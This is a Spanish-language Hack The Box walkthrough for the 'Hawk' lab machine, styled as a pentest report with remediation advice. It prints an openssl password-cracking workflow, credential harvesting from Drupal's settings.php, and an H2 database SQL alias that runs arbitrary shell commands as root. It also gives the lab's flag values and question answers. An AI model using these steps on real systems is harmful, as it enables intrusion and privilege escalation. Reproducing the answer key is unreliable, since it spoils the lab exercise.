---
title: "Informe Técnico: Hawk (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Hawk de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Hawk

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Hawk** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Hawk |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Hawk?**

R: 6

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_01.png)

What content management system is running on TCP port 80?

R: drupal

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_02.png)

![Captura de pantalla 2025-08-24 143506.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_03.png)

**What is the name of the encrypted file available on the FTP server?**

R: .drupal.txt.enc

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_04.png)

**What program is responsible for encrypting `.drupal.txt.enc`?**

R: openssl

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_05.png)

**What user is running the Drupal blog on Hawk?**

R: PencilKeyboardScanner123

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_06.png)

```jsx
for i in $(seq 0 8 176); do                                                          
python3 -c "import sys; sys.stdout.buffer.write(b'A'*$i)" > "$i"
done
```

```jsx
cat > [encrypt.sh](http://encrypt.sh/) <<'BASH'                                                             
#!/usr/bin/env bash
set -euo pipefail
PASS='PleaseSubscribe'
```

```jsx
while IFS= read -r cipher; do
[[ -z "$cipher" || "$cipher" =~ ^# ]] && continue
for length in $(ls -1 | grep -E '^[0-9]+$' | sort -n); do
out="${length}.${cipher}.enc"
echo "=> openssl enc -$cipher -e -in $length -out $out -k *****"

if ! openssl enc -"$cipher" -e -in "$length" -out "$out" -k "$PASS" 2>/dev/null; then
echo "[!] skipping cipher $cipher (not supported?)"
rm -f "$out"
fi
done
done < cipher.lst
BASH
```

```jsx
cat > cipher.lst <<'EOF'                                                            
aes-256-cbc
aes-192-cbc
aes-128-cbc
aes-256-ofb
aes-128-ofb
rc4
aria-128-cbc
des
EOF
```

```jsx
wc -c * | grep '176 ‘
```

```jsx
sudo apt update                                                                        
sudo apt install -y bruteforce-salted-openssl
```

```jsx
base64 -d .drupal.txt.enc > drupal.openssl 
```

```jsx
bruteforce-salted-openssl -t 8 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d md5 drupal.openssl
```

```jsx
bruteforce-salted-openssl -t 8 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 drupal.openssl
```

```jsx
openssl enc -d -aes-256-cbc -md sha256 -salt -in drupal.openssl -out drupal.txt -k 'friends'

```

**What user is running the Drupal blog on Hawk?**

R: www-data

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_08.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_09.png)

**What is the drupal user's password to connect to the MySQL database?**

R: drupal4hawk

![Captura de pantalla 2025-08-24 165150.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_10.png)

```jsx
www-data@hawk:/var/www/html/sites/default$ cat settings.php

```

**Submit the flag located in the daniel user's home directory.**

R: a5fd7a6995ba44600da05a092e788b3c

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_11.png)

**On what TCP port is the H2 database listening?**

R:8082

![Captura de pantalla 2025-08-24 171113.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_12.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_13.png)

**What user is the H2 database running as?**

R: root

**Submit the flag located in the root user's home directory.**

R: a97fc889aa3e581c5a1b05dab89d802a

```jsx
DROP ALIAS IF EXISTS SHELLEXEC;
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException, InterruptedException {
String[] c = {"/bin/sh","-c", cmd};
Process p = Runtime.getRuntime().exec(c);
java.io.InputStream both =
new java.io.SequenceInputStream(p.getInputStream(), p.getErrorStream());
java.util.Scanner s = new java.util.Scanner(both);
s.useDelimiter("\\A");
String out = s.hasNext() ? s.next() : "";
p.waitFor();
return out;
}
$$;
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_14.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/hawk/images/step_15.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
